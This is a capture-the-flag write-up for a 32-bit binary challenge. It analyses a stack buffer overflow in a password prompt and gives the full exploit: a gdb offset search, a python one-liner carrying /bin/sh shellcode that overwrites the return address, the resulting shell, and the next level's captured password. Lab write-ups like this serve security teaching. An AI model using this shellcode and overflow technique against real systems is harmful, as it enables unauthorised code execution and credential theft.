## 1- Intro

The program prompts for username and password and returns 0 or 1
to check if password is valid.

First username `fgets` chars is safe because it is limited and reads to
the global variable

`0x0804a040  a_user_name`

And compares first 7 chars to the string `dat_wil`

But the second `fgets` is unsafe because it is limited to 100 but size of the buffer is 16 and it is on the stack

```c
  int password_buffer [16];
  ...
  fgets((char *)password_buffer,100,0);
```

```sh
   0x080484d8 <+8>:     sub    $0x60,%esp
   0x080484db <+11>:    lea    0x1c(%esp),%ebx
   0x080484df <+15>:    mov    $0x0,%eax
   # Size of stack buffer for password is 16
   0x080484e4 <+20>:    mov    $0x10,%edx
...
   0x0804855c <+140>:   mov    0x804a020,%eax
   0x08048561 <+145>:   mov    %eax,0x8(%esp)
   # Size of read is 100
   0x08048565 <+149>:   movl   $0x64,0x4(%esp)
   0x0804856d <+157>:   lea    0x1c(%esp),%eax
   0x08048571 <+161>:   mov    %eax,(%esp)
   0x08048574 <+164>:   call   0x8048370 <fgets@plt>
```

So there is easy task to overflow it and point EIP return pointer to
our SHELLCODE which we can store in username input as it is limited to 256 size read.

## 2 - Hack

### Get ret address offset and shellcode

With pattern generator https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

get offset for EIP

```sh
gdb ./level01
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af
(gdb) i r
...
eip            0x37634136       0x37634136
...
(gdb) 
```

which is 80 

and shellcode from https://raw.githubusercontent.com/offensive-security/exploit-database/master/shellcodes/linux_x86/47513.c

## 3 - Compose attack input and run

For first input add `dat_wil` to pass the name check and `shellcode`

For the second input using offset 80 and `a_user_name` address + 7 (to skip dat_will) override EIP register to redirect program flow to the shellcode

```sh
rm /tmp/exp1
python -c 'sc = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80";print "dat_wil" + sc + "\n" + "A" * 80 + "0x0804a047"[2:].decode("hex")[::-1]' > /tmp/exp1
cat /tmp/exp1 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
